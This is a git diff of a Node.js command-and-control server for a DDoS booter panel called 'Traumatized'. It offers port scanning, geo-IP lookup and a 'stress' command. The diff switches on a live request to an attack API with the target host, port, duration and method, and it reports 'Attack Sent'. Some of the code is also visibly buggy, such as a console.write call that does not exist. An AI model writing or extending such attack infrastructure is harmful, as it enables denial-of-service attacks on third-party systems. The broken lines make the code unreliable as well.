@@ -11,7 +11,7 @@ const server = new Net.Server();
 const config = require("./config/strings.js");
 const crud = require("./auth/crud.js");
 const auth = require("./auth/login.js");
-const banners = require("./extra/banners");
+const banners = require("./extra/banners.js");
 
 const sleep = (milliseconds) => {
     return new Promise(resolve => setTimeout(resolve, milliseconds))
@@ -24,8 +24,7 @@ server.listen(port, function() {
 
 server.on('connection', function(socket) {
     //set_title("Welcome To Scrapy's CNC!", socket);
-    socket.write(config.Colors.movingtext2 + "Traumatized\r\n" + config.hostname);
-    
+    socket.write(banners.main() + config.hostname())
     console.log("A new connection has been established");
     var socket_port = socket.remotePort;
     var socket_ip = socket.remoteAddress.replace("::ffff:", "");
@@ -58,39 +57,55 @@ server.on('connection', function(socket) {
         /*
         Main Functions
         */
-        
+        config.GetCurrentUser(socket_ip);
         if(crud.isSignedIn(socket_ip) == true) {
             if(cleanSTR.startsWith("testing")) {
-                socket.write("Testing\r\n" + config.hostname);
+                socket.write("Testing\r\n" + config.hostname());
             } else if(cleanSTR.startsWith("methods")) {
-                f('https://scrapy.tech/methods.txt').then(res => socket.write(res.text()));
+                f('https://scrapy.tech/methods.txt').then(res => res.text()).then(body => {
+                    if(body) {
+                        console.write(body + "\r\n" + config.hostname(config.CurrentUser.Username));
+                    } else {
+                        console.write("Error, Cound't pull current methods LIVE!" + config.hostname(config.CurrentUser.Username));
+                    }
+                });
             } else if(cleanSTR.startsWith("geo")) {
                 let ip = config.CurrentCMD.arg[1];
                 f('https://scrapy.tech/tools/?action=geoip&q='+ip).then(res => res.text()).then(body => {
                     if(body) {
-                        socket.write(banners.geoBanner() + body + config.hostname);
+                        socket.write(banners.geoBanner() + body + "\r\n"+ config.hostname(config.CurrentUser.Username));
                     } else {
-                        socket.write("[x] Error, Couldn't fetch geo results")
+                        socket.write("[x] Error, Couldn't fetch geo results\r\n" + config.hostname(config.CurrentUser.Username))
                         console.log("[x] Error, Couldn't fetch geo results")
                     }
                 })
             } else if(cleanSTR.startsWith("pscan")) {
                 let ip = config.CurrentCMD.arg[1]
-                f('https://scrapy.tech/tools/?action=portscan&q='+ip).then(res => res.text()).then(body => {
-                    if(body) {
-                        socket.write(body + "\r\n" + config.hostname);
+                f('https://scrapy.tech/tools/?action=portscan&q=' + ip).then(res => res.text()).then(body => {
+                    if (body) {
+                        socket.write(body + "\r\n" + config.hostname(config.CurrentUser.Username));
                         console.log(body);
                     } else {
-                        socket.write("[x] Error. Couldn't fetch PortScanner results!\r\n" + config.hostname)
+                        socket.write("[x] Error. Couldn't fetch PortScanner results!\r\n" + config.hostname(config.CurrentUser.Username))
                         console.log("[x] Error. Couldn't fetch PortScanner results!");
                     }
                 })
+            } else if(cleanSTR.startsWith("clear")) {
+                socket.write(config.Colors.Clear + config.hostname(config.CurrentUser.Username))
             } else if(cleanSTR.startsWith("stress")) {
                 let ip = config.CurrentCMD.arg[1]
                 let port = config.CurrentCMD.arg[2]
                 let time = config.CurrentCMD.arg[3]
                 let method = config.CurrentCMD.arg[4]
-                // f('https://api.com/api.php?key=key&host='+ip+"&port="+port+"&time="+time+"&method="+method)
+                f('https://api.com/api.php?key=key&host=' +ip + "&port=" + port + "&time=" + time + "&method=" + method).then(res => res.text()).then(body => {
+                    console.log(body);
+                    if(body.toLowerCase().includes("attack sent")) {
+                        socket.write("Attack Sent To " + ip + ":" + port + " for " + time + " seconds with " + method);
+                    }
+                })
+                f('https://api.com/api.php?key=key&host=' +ip + "&port=" + port + "&time=" + time + "&method=" + method).then(res => res.text()).then(body => {
+                    console.log(body);
+                })
             } else if(cleanSTR.startsWith("exit")) {
                 socket.write("Closing Traumatized.")
                 socket.write(config.Colors.Clear)
@@ -99,16 +114,16 @@ server.on('connection', function(socket) {
                 socket.write("Closing Traumatized...")
                 socket.close()
             } else {
-                socket.write("[x] Command not found!\r\n" + config.hostname);
+                socket.write("[x] Command not found!\r\n" + config.hostname(config.CurrentUser.Username));
             }
         } else if(cleanSTR.startsWith("-")) {
             let username = config.CurrentCMD.arg[0].replace("-", "");
             let pw = config.CurrentCMD.arg[1];
             let login_response = auth.login(username, pw, socket_ip);
             if(login_response.includes("Successfully")) {
-                socket.write(login_response + "\r\n" + config.hostname);
+                socket.write(login_response + "\r\n" + config.hostname(config.CurrentUser.Username));
             } else {
-                socket.write(login_response + "\r\n");
+                socket.write(login_response + "\r\n" + config.hostname(""));
             }
         } else {
             socket.write("Must login\r\nUsage: <username> <password>\r\n")
